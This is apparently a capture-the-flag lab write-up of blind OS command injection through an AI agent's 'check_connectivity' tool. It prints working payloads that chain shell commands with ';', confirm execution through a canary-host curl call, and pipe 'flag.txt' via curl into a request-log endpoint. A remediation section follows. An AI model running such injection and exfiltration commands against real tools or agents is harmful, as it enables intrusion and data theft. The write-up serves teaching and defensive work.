# Advanced L9 — Blind Network Ninja

| | |
|---|---|
| **Class** | OS command injection with suppressed output, exploited out-of-band |
| **CWE** | CWE-78, CWE-201 (data in sent data) |
| **OWASP LLM** | LLM06:2025 — Excessive Agency |
| **Severity** | High (qualitative — no CVSS; privilege inputs not fully established) |
| **Flag** | `flag-XXXXXX` (redacted) |

## The target

A "network discovery service" with one tool, `check_connectivity(host)`, described as: *"Pings a host to check if it's online. Returns 'Online' if the host is reachable, 'Offline' otherwise."*

The response is a one-bit oracle. No stdout, no errors, no timing hints. This is the interesting case: the output is fully suppressed, and the vulnerability is still complete.

## The path

**1. Baseline the oracle.** `127.0.0.1` → `Online`. A unique, non-resolving hostname → `Offline`. The reply says nothing about *how* the check ran.

**2. Prove execution, not reachability.** Append a second command:

```text
127.0.0.1;curl http://<unique-canary>/
```

`Offline` — but the canary resolved, with dozens of DNS interactions from the platform's egress addresses. A ping wrapper does not make DNS queries to an attacker-chosen name. The `;` was interpreted by a shell.

**3. Pick a sink that survives suppression.** External callbacks work but are noisy and off-platform. The level's own request log is better: `GET /level/9/logs` returns inbound requests to `localhost` with server-side timestamps, and the workload can reach `localhost`.

```text
127.0.0.1;curl http://127.0.0.1/L9PROOF<unique>
```

`Online`, and `GET /L9PROOF<unique>` appears in the log. Execution confirmed on-platform, with a timestamp we did not have to trust the client for.

**4. Exfiltrate.**

```text
google.com; cat flag.txt | curl -G --data-urlencode x@- http://localhost/level/9/logs
```

Reply: `Online`. Log entry: `GET /level/9/logs?x=flag-XXXXXX`.

**5. Confirm.** `POST /level/9/submit-flag` → `{"success":true,"level_completed":true}`.

## Root cause

User-controlled host text is interpolated into a shell command behind `check_connectivity`, with no metacharacter rejection and no argument-vector boundary. Output suppression hides stdout; it does not remove execution, egress, or side effects.

The logging endpoint is the second half of the finding: a request logger that records arbitrary inbound paths and is readable through the API is a local exfiltration sink. You do not need the internet to leak data out of a workload that can call itself.

## What did not work

Useful negative results, because they bound the claim:

| Technique | Result |
|---|---|
| `\n` as command separator | No effect — newline-separated lines did not execute |
| `$(...)` substitution | No DNS interaction from `nslookup $(cat flag.txt).<canary>` |
| `curl -T` upload, `xargs -a` | No interaction; those lines did not run |

Only `;` chained reliably. Reporting this is not a footnote — it tells the defender which pattern to filter and tells the reader the finding was measured, not guessed.

## Impact

**Demonstrated:** blind command execution, file read, and data exfiltration with no output channel — the flag left the workload through the platform's own request log.

**Real-world equivalent:** any agent tool that shells out with a user-supplied fragment. Typical blast radius: read anything the service account can read, reach internal services from inside the trust boundary, and exfiltrate over DNS or HTTP if egress is open.

## Remediation

- Do not build shell strings from user input. Use `execve` with an argument vector (`["ping","-c","1",host]`), and validate `host` as a hostname or IP with a strict parser.
- Default-deny egress. Allowlist resolvers and destinations; log DNS and outbound HTTP.
- Treat request-log endpoints as sensitive: a sink reachable by the workload is an exfil channel. Do not expose it to the same principal the workload serves.
- Detect encoded payloads in query strings at the application layer — `?x=<base64 or file contents>` is not normal health-check traffic.
- Give the tool a capability ceiling: a connectivity check needs no file access and no write access, so run it somewhere that has neither.
